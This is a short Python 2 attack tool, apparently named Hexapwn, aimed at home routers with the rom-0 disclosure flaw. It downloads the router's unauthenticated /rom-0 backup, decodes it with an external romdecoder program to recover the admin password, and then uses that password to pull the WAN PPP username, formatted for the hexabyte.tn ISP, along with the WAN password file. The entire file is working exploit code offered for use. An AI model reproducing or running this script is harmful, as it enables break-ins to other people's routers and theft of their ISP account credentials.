#!/usr/bin/python
import urllib2
import sys
import os
from termcolor import colored
import urllib2, base64
import commands
import bs4 as BeautifulSoup

def banner():
 print """
 _   _                                    
| | | | _____  ____ _ _ ____      ___ __  
| |_| |/ _ \ \/ / _` | '_ \ \ /\ / / '_ \ 
|  _  |  __/>  < (_| | |_) \ V  V /| | | |
|_| |_|\___/_/\_\__,_| .__/ \_/\_/ |_| |_|
                     |_|                  
                                     v1.0 
                  K4tsum0t0 Security Team

"""

def download(ip,path):
	try:
		romurl="http://"+ip+"/rom-0"
  		response = urllib2.urlopen(romurl)
  		html = response.read()
  	except:
  		print colored("NOT VULNERABLE !","red")

  	try:
  		f = open(path,'w')
  		f.write(html)
  		f.close()
  	except:
  		print "error opening file"

def extract(path):
	try:
		return commands.getstatusoutput("./romdecoder "+path)
	except:
		print "error run gcc -o romdecoder RomDecoder.c"

def wan_extract(ip, password):
	try:
		request = urllib2.Request("http://"+ip+"/basic/tc2wanfun.js")
		base64string = base64.encodestring('%s:%s' % ("admin", password)).replace('\n', '')
		request.add_header("Authorization", "Basic %s" % base64string)   
		result = urllib2.urlopen(request)
		print result.read()
	except:
		print "error downloading WAN password file"
		print colored("[-] may be not vulnerable", "yellow")


def wan_user(ip,password):
	try:
		request = urllib2.Request("http://"+ip+"/basic/home_wan.htm")
		base64string = base64.encodestring('%s:%s' % ("admin", password)).replace('\n', '')
		request.add_header("Authorization", "Basic %s" % base64string)   
		result = urllib2.urlopen(request)
		html=result.read()
		soup = BeautifulSoup.BeautifulSoup(html, "lxml")
		name= soup.find("input",{"name":"wan_PPPUsername"})["value"]
		print "username = "+name+"@hexabyte.tn"
	except:
		print "error downloading WAN username"
		print colored("[-] may be not vulnerable", "yellow")



banner()
if len(sys.argv)<2:
	print "usage : "+ sys.argv[0]+" router_ip"
	exit()

ip = str(sys.argv[1])
tes = "[+] Checking "+ip+" ..."
print colored(tes,'yellow')
download(ip,"rom01")
print colored("[+] Vulnerable", 'green')
password = extract("rom01")
password_wan = password[1].split(':')[1].strip()
print "admin password : "+ password_wan
print colored("[+] extracting WAN credentials ...","yellow")
wan_user(ip,password_wan)
wan_extract(ip,password_wan)
